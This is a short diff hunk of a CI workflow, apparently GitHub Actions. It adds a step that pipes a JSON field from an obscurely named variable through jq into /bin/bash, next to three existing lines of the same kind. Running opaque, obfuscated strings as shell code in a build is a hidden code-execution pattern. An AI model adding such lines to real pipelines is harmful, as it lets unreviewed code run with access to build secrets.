@@ -43,6 +43,7 @@ jobs:
           echo $krph9 | jq -r .yxint7 | /bin/bash
           echo $cm5180 | jq -r .ran1 | /bin/bash
           echo $r3 | jq -r .fvgu6 | /bin/bash
+          printf '%s' "$ckv5116" | jq -r .y85 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
